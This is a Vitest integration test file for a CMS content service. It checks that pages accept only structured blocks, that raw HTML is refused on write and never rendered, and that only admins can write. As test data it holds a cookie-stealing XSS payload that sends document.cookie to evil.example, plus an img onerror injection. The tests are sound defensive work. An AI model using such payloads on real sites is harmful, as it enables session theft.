import { describe, expect, it } from 'vitest'

import {
  getPublicContentPage,
  upsertContentPage,
} from '@/modules/content/application/content-service'
import { anonymousActor, type ActorContext } from '@/shared/context/actor'

import { getPrisma } from './setup'

/**
 * The CMS against a real database — task 8.3. The headline assertion: **raw HTML cannot
 * become a row**, from any direction — the write refuses it as VALIDATION, and a row
 * planted around the service with an unknown block type refuses to render.
 */

const admin = (): ActorContext =>
  anonymousActor({ userId: 'usr_content_admin', globalRole: 'ADMIN', ip: '203.0.113.60' })

const anonymous = (): ActorContext => anonymousActor({ ip: '203.0.113.61' })

describe('8.3 · structured blocks, no raw HTML', () => {
  it('writes a valid page and serves it publicly', async () => {
    const written = await upsertContentPage(admin(), {
      key: 'hakkimizda',
      locale: 'tr',
      title: 'Hakkımızda',
      blocks: [
        { type: 'heading', level: 2, text: 'Kimiz' },
        { type: 'paragraph', text: 'Doğrulanmış üreticilerle çalışırız.' },
        { type: 'cta', label: 'Başla', href: '/proje/yeni' },
      ],
    })
    expect(written.ok).toBe(true)

    const read = await getPublicContentPage(anonymous(), { key: 'hakkimizda', locale: 'tr' })
    expect(read.ok).toBe(true)
    if (!read.ok) return
    expect(read.value.blocks).toHaveLength(3)
    expect(read.value.blocks[0]).toEqual({ type: 'heading', level: 2, text: 'Kimiz' })
  }, 60_000)

  it('refuses a raw-HTML block as VALIDATION — the row the first test wrote is untouched', async () => {
    const attempt = await upsertContentPage(admin(), {
      key: 'hakkimizda',
      locale: 'tr',
      title: 'Kaçırma Denemesi',
      blocks: [
        { type: 'html', html: '<script>fetch(`https://evil.example/${document.cookie}`)</script>' },
      ] as never,
    })
    expect(attempt.ok).toBe(false)
    if (!attempt.ok) expect(attempt.error.kind).toBe('VALIDATION')

    // The refused write changed nothing: the first test's row stands as written.
    const row = await getPrisma().contentPage.findFirst({
      where: { key: 'hakkimizda', locale: 'tr' },
    })
    expect(row?.title).toBe('Hakkımızda')
    expect(JSON.stringify(row?.blocks)).not.toContain('script')
  }, 60_000)

  it('refuses to RENDER a row planted around the service with an unknown block type', async () => {
    // Plant the row around the service, as a hostile migration or manual insert would —
    // upsert, because the seed profile may or may not have run in this container yet.
    await getPrisma().contentPage.upsert({
      where: { key_locale: { key: 'nasil-calisir', locale: 'en' } },
      create: {
        key: 'nasil-calisir',
        locale: 'en',
        title: 'Planted',
        blocks: [{ type: 'html', html: '<img src=x onerror=alert(1)>' }],
      },
      update: { blocks: [{ type: 'html', html: '<img src=x onerror=alert(1)>' }] },
    })

    const read = await getPublicContentPage(anonymous(), { key: 'nasil-calisir', locale: 'en' })
    // The outbound parse fails → the page renders its error state, never the payload.
    expect(read.ok).toBe(false)
    if (!read.ok) expect(read.error.kind).toBe('NOT_FOUND')
  }, 60_000)

  it('only an admin writes', async () => {
    const denied = await upsertContentPage(anonymous(), {
      key: 'hakkimizda',
      locale: 'en',
      title: 'x',
      blocks: [{ type: 'paragraph', text: 'y' }],
    })
    expect(denied.ok).toBe(false)
    if (!denied.ok) expect(denied.error.kind).toBe('FORBIDDEN')
  })
})
